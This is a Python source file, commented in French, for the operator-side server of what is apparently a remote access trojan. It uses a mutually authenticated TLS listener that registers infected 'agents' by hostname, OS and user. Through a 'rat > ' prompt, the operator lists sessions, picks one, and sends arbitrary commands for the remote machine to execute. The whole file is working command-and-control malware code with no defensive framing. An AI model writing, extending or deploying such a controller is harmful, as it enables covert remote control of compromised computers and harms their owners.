# écouter sur un port
# accepter connexions
# lancer threads
import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json
from server.sessions import SessionManager
import sys

logger = setup_logger()


class SSLServer:
    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        self.host = host
        self.port = port
        self.chunk_size = chunk_size
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)
        self.sessions = SessionManager()

    def connect(self):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:

            sock.bind((self.host, self.port))
            sock.listen(5)

            print("Server listening")
            logger.info("Server listening")

            while True:

                conn, addr = sock.accept()

                try:

                    sconn = self._context.wrap_socket(
                        conn,
                        server_side=True,
                    )

                    print("Client connected:", addr[0])
                    logger.info("Client connected: %s", addr[0])

                    data = sconn.recv(self.chunk_size)

                    if not data:
                        logger.warning("Client disconnected before sending info")
                        sconn.close()
                        continue

                    client_info = json.loads(data.decode())

                    logger.info(
                        "New agent: %s | %s | %s | %s",
                        client_info["hostname"],
                        client_info["os"],
                        client_info["user"],
                        client_info["release"],
                    )

                    session_id = self.sessions.add(
                        sconn,
                        client_info,
                    )

                    logger.info(
                        "New session %s for %s",
                        session_id,
                        client_info["hostname"],
                    )

                    Thread(
                        target=self._handle_client,
                        args=(
                            sconn,
                            client_info,
                            session_id,
                        ),
                        daemon=True,
                    ).start()

                except ssl.SSLError:

                    print("SSL handshake failed")
                    logger.error("SSL handshake failed")

    def _recv(self, sock):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:
                    print("Client disconnected")
                    logger.warning("Client disconnected")
                    break

                print(data.decode())

        except ConnectionResetError:

            print("Client forcibly closed connection")
            logger.warning("Client forcibly closed connection")

        except ssl.SSLError:

            print("SSL error")
            logger.error("SSL error")
        except Exception as e:

            print(f"Error: {e}")

        finally:

            sock.close()

    def _handle_client(self, sock, client_info, session_id):

        logger.info(
            "Handler started for %s (%s)",
            client_info["hostname"],
            client_info["os"],
        )

        sock.settimeout(1)

        try:

            while True:

                try:

                    command = input("rat > ").strip()

                    if not command:
                        continue

                    if command == "exit":
                        sys.exit(0)

                    if command == "sessions":
                        self.sessions.list_sessions()
                        continue

                    if command.startswith("interact"):

                        try:
                            session_id = int(command.split()[1])
                            self.sessions.interact(session_id)
                        except (IndexError, ValueError):
                            print("Usage: interact <id>")
                            continue

                    if self.sessions.current_session is None:
                        print("No session selected")
                        continue

                    session = self.sessions.sessions[self.sessions.current_session]

                    sock = session["socket"]

                    sock.sendall(command.encode())

                    logger.info(
                        "Command sent to %s: %s",
                        client_info["hostname"],
                        command,
                    )

                    data = sock.recv(self.chunk_size)

                    if not data:
                        logger.warning(
                            "Client disconnected: %s",
                            client_info["hostname"],
                        )

                        self.sessions.remove(session_id)

                        break

                    response = data.decode(errors="ignore")

                    print(response)

                except socket.timeout:

                    continue

                except (
                    ConnectionResetError,
                    BrokenPipeError,
                ):

                    logger.warning(
                        "Client connection lost: %s",
                        client_info["hostname"],
                    )
                    self.sessions.remove(session_id)
                    break

        finally:

            sock.close()

            logger.info(
                "Socket closed for %s",
                client_info["hostname"],
            )


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
